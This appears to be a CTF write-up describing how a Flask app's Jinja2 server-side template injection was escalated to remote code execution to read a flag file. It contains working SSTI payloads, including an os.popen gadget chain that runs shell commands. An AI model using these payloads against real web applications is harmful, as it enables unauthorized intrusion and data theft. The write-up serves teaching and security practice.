# CTF Writeup: **Server-Side Template Injection (SSTI) with RCE Exploit**

## Overview

In this challenge, we exploited a **Flask** web application vulnerable to **Server-Side Template Injection (SSTI)**. We escalated the vulnerability to **Remote Code Execution (RCE)**, allowing us to gain access to the system and retrieve the **flag**.

---

## Step-by-Step Exploitation

### 1. **Identifying the Vulnerability: SSTI**

The first step was to confirm that the application was vulnerable to **Server-Side Template Injection**. Since the web app used **Flask** with the **Jinja2** template engine, we tried injecting common Jinja2 syntax into user inputs.

#### Injecting Basic Jinja2 Payloads:

We injected the following simple expression into an input field to test for **SSTI**:
```python
{{7*7}}
```

**Expected Outcome**: If the server evaluates the expression and returns `49`, it confirms the presence of **SSTI**.

If this works and returns `49`, we know the app is vulnerable to **SSTI** and we can move forward to exploit it further.

---

### 2. **Escalating to Remote Code Execution (RCE)**

Once we confirmed **SSTI**, the next step was to escalate it to **Remote Code Execution (RCE)**.

#### Crafting a Payload to Execute Python Code

To execute arbitrary Python code on the server, we injected a payload that used the **`os.popen()`** method to execute a command:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

**Expected Outcome**: This payload should execute the `id` command on the server and return the current user information.

This step confirmed **RCE** on the server, and we were able to interact with the system.

---

### 3. **Exploring the File System**

With **RCE** confirmed, we started exploring the server file system to find useful files, such as the **flag**.

#### Checking the Contents of the `/challenge` Directory

The challenge files were likely stored in the `/challenge` directory, so we listed its contents:

```bash
ls -la /challenge
```

**Output**:
```bash
total 12
drwxr-xr-x 2 root root 32 Mar 17 13:49 __pycache__
-rwxr-xr-x 1 root root 1241 Mar 6 03:27 app.py
-rw-r--r-- 1 root root 58 Mar 6 19:44 flag
-rwxr-xr-x 1 root root 268 Mar 6 03:27 requirements.txt
```

**Key Findings**:
- The `flag` file was present and had world-readable permissions (`rw-r--r--`).
- The `app.py` file was the main Python application, and we could inspect it to understand the app's logic further.
- We could also review `requirements.txt` to check the dependencies for any vulnerable packages.

---

### 4. **Accessing the Flag**

Since the `flag` file had read permissions for all users (`rw-r--r--`), we could directly access and read it:

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}
```

**Flag Output**:
```
picoCTF{flag_is_here}
```

---

### 5. **Conclusion**

By exploiting **Server-Side Template Injection (SSTI)**, we gained **Remote Code Execution (RCE)** on the server, allowing us to explore the file system and retrieve the flag. This challenge demonstrates the critical security risk of improperly sanitizing user input in web applications using template engines like **Jinja2**.

---

## Flag

```
picoCTF{flag_is_here}
```

---

## Tools and Techniques Used

- **Flask** (Python web framework)
- **Jinja2** (Template engine)
- **Python** (Command execution via `os.popen()`)
- **Linux shell** (for navigating and reading files)

---

## Security Takeaway

This challenge highlights the importance of **sanitizing user input** when using template engines like **Jinja2**. **Server-Side Template Injection (SSTI)** can easily escalate to **Remote Code Execution (RCE)** if input is not properly handled, leading to severe vulnerabilities in web applications.
